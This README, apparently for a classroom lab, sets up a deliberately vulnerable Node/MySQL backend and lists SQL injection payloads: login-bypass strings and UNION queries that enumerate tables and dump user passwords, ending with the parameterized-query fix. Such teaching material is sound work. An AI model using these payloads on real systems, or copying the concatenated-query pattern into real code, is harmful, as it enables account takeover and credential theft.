# SQL Injection Lab — Vulnerable Backend

**Educational use only.** This backend is intentionally vulnerable to demonstrate OWASP A05 (Injection). Uses **MySQL** with credentials from `.env`.

## Setup

1. **Create the database** (in MySQL client or phpMyAdmin):
   ```sql
   CREATE DATABASE sql_injection_lab;
   ```

2. **Configure credentials** — copy `.env.example` to `.env` and set your MySQL values:
   ```
   DB_HOST=localhost
   DB_PORT=3306
   DB_USER=root
   DB_PASSWORD=your_password
   DB_NAME=sql_injection_lab
   ```

3. **Install and run:**
   ```bash
   npm install
   npm start
   ```

Open **http://localhost:3000** in your browser.

## Seed Credentials (normal login)

| Email           | Password   |
|----------------|------------|
| user@test.com  | password123 |
| admin@test.com | adminpass   |

## Part 3–4: Login Bypass

- **Admin bypass (comment out password):**  
  Email: `admin' --`  
  Password: anything (e.g. `x`)

- **Universal bypass:**  
  Email: `' OR 1=1 --`  
  Password: anything

## Part 5: Data Extraction (UNION injection)

1. Log in (normal or bypass), go to Dashboard.
2. Use the **User search** box. The backend runs:
   `SELECT id, email FROM users WHERE email LIKE '%<your_input>%'`
3. **Get table names (MySQL):**  
   `' UNION SELECT table_name, 2 FROM information_schema.tables --`
4. **Dump credentials:**  
   `' UNION SELECT email, password FROM users --`

Or call the API directly:  
`GET /api/search?q=<payload>`

## Endpoints

| Method | Path        | Purpose                    | Vulnerable |
|--------|-------------|----------------------------|------------|
| POST   | /login      | Login (email + password)   | Yes        |
| POST   | /signup     | Register                   | Yes        |
| POST   | /dashboard  | Session: current user      | No         |
| GET    | /admin      | Admin-only (session)      | No         |
| GET    | /api/search | Search users by email     | Yes (UNION)|

## Fix (not implemented here)

Use **parameterized queries** so user input is never part of the SQL string, e.g.:

```js
db.prepare('SELECT * FROM users WHERE email = ? AND password = ?').get(email, password);
```

Never concatenate user input into SQL.
